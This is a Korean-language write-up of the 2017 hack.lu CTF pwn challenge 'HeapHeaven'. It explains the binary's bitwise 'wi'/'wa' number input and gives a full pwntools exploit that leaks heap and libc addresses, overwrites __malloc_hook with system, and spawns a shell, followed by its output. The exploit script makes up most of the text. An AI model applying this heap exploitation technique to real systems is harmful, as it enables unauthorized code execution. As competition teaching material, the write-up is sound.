# 2017 hack.lu - [PWN] HeapHeaven

## Key words

- x86_64 ELF
- leak using FD in heap
- overwrite malloc hook

## Solution

문제 내용을 보면 다음과 같습니다.

```
1. 할당
2. 노출
3. 수정
4. 해제
```

딱히 인덱스를 검사 하지도 않고 할당 해제에 대한 제한이 없기 때문에 힙 주소와 라이브러리 주소를 릭하고 `__malloc_hook`에 시스템 함수를 넣은 뒤, 인자로 `/bin/sh\x00`주소를 넣으면 쉽게 익스가 가능합니다.

다만 한 가지 이슈로는 입력의 값을 희안하게 받습니다.

```c
__int64 __fastcall parse_num(char *a1)
{
  signed int i; // [sp+14h] [bp-Ch]@1
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = 0LL;
  for ( i = 0; i <= 63; ++i )
  {
    if ( a1[2 * i] == 'w' )
    {
      v3 *= 2LL;
      if ( a1[2 * i + 1] == 'i' )
      {
        ++v3;
      }
      else if ( a1[2 * i + 1] != 'a' )
      {
        puts("I did my very best, darling!");
        return v3;
      }
    }
  }
  return v3;
}
```

이런식으로 비트 연산 처럼 숫자를 입력 받습니다.

예를들어 `wi`를 입력하면 1, `wiwi`를 입력하면 3, `wiwa`를 입력하면 2, ... 이런식으로 숫자를 받게 됩니다. 그래서 제가 원하는 숫자를 만들어 주는 스트링을 생성하는 함수를 하나 제작한 뒤, 진행하면 됩니다.

## Solution Code

```python
from pwn import *

def gen_num(n):
	#  0  1  0  1  0  0  0  0
	# wa wi wa wi wa wa wa wa

	#    01 01 00 00
	# wi wi wi wa wa

	#ret = "wi"
	ret = ""
	cnt = 0

	temp = bin(n)[2:]
	temp = '0'*(len(temp)%2) + temp

	i = 0
	while i < len(temp):
		if temp[i] == "0":
			ret += "wa"
		else:
			ret += "wi"
		i += 1

	return ret + "\x00" * (128 - len(ret))

def malloc(size, trigger=False):
	r.send("whaa!" + "\x0a")
	print r.recv()

	r.sendline(gen_num(size))

	if trigger:
		r.interactive()
		exit()

	print r.recv()

def leak(index):
	r.send("mommy?" + "\x0a")

	r.sendline(gen_num(index))
	data = r.recv()

	print data, data.encode("hex")
	return data

def edit(index, msg):
	r.send("<spill>" + "\x0a")
	print r.recv()

	r.sendline(gen_num(index))
	print r.recv()

	r.send(msg + "\x0a")
	print r.recv()

def free(index):
	r.send("NOM-NOM" + "\x0a")
	r.sendline(gen_num(index))
	print r.recv()

def my_leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print r.hexdump(addr, size, begin=addr, skip=False)

import sys

r = None

server = "flatearth.fluxfingers.net"
port = 1743

DEBUG = 0

if len(sys.argv) == 2:
	r = process("./hh")
	DEBUG = 1
else:
	r = remote(server, port)

print r.recvuntil("NOM-NOM\n")

# happa : 0x100203010
happa = 0x100203010

# heap leak
# libc leak
# calculate libc - heap
# overwite __malloc_hook as one_shot
# malloc (trigger)

malloc(0x20)
malloc(0x20)
malloc(0x20)

free(0x20)
free(0x50)

ret = leak(0x50)

ret = ret.split("darling: ")[1].split("\n")[0]
heap = u64(ret.ljust(8, "\x00")) - 0x20

#if DEBUG == 1:
#	heap += 0x100000000

print "heap : ", hex(heap)

free(0x80)

malloc(0x100)
malloc(0x100)

free(0xb0)

ret = leak(0xb0)
ret = ret.split("darling: ")[1].split("\n")[0]
libc_base = u64(ret.ljust(8, "\x00")) - 0x3c4b78

''' local info '''
one_shot      = libc_base + 0x4526a
system        = libc_base + 0x45390
__malloc_hook = libc_base + 0x3c4b10
__free_hook   = libc_base + 0x3c67a8
__libc_start_main = libc_base + 0x20740
binsh         = libc_base + 0x18cd17

print "libc : ", hex(libc_base)
print "malloc_hook: ", hex(__malloc_hook)
print "binsh : ", hex(binsh)

offset = __malloc_hook - heap - 0x10
offset_binsh = binsh - heap
print "offset : ", hex(offset)
print "offset (binsh) : ", hex(offset_binsh)

#edit(offset, p64(one_shot))
edit(offset, p64(system))

raw_input()

malloc(binsh, True)
```

## Result

```
hackability@ubuntu:~/ctfing/2017_hacklu/pwn/heapheaven$ python sol_hh.py 1
[+] Starting local process './hh': pid 21865
Climbing to heap heaven!

         mom, you up there?
               /
       ,==.              |~~~
      /  66\             |
      \c  -_)         |~~~
       `) (           |
       /   \       |~~~
      /   \ \      |
     ((   /\ \_ |~~~
      \\  \ `--`|
      / / /  |~~~
 ___ (_(___)_|

<...snip...>
See what we have here, darling: x\x1b??\xff\x7f
========
whaa!
mommy?
<spill>
NOM-NOM
5365652077686174207765206861766520686572652c206461726c696e673a20781bddf7ff7f0a3d3d3d3d3d3d3d3d0a77686161210a6d6f6d6d793f0a3c7370696c6c3e0a4e4f4d2d4e4f4d0a
libc :  0x7ffff7a0d000
malloc_hook:  0x7ffff7dd1b10
binsh :  0x7ffff7b99d17
offset :  0x2aaaa267ab00
offset (binsh) :  0x2aaaa2442d17
What are you doing?

Look at this mess, darling!

========
whaa!
mommy?
<spill>
NOM-NOM


I'll prepare your happa happa, darling...

[*] Switching to interactive mode
$ ls -al
total 9252
drwxrwxr-x 2 hackability hackability    4096 Oct 22 15:12 .
drwxrwxr-x 6 hackability hackability    4096 Oct 19 01:52 ..
-rw------- 1 hackability hackability 6803456 Oct 18 11:48 core
-rw------- 1 hackability hackability     645 Oct 19 01:52 .gdb_history
-rwxrwxrwx 1 hackability hackability  762936 Oct 17 07:33 HeapHeaven-3b8f9014278cb5365ed21479dda83bbf.zip
-rwxrwxrwx 1 hackability hackability   13208 Oct 16 17:47 hh
-rwxrwxrwx 1 hackability hackability 1868984 Oct 16 17:47 libc.so.6
-rw-rw-r-- 1 hackability hackability    2366 Oct 22 15:05 sol_hh.py
$
```
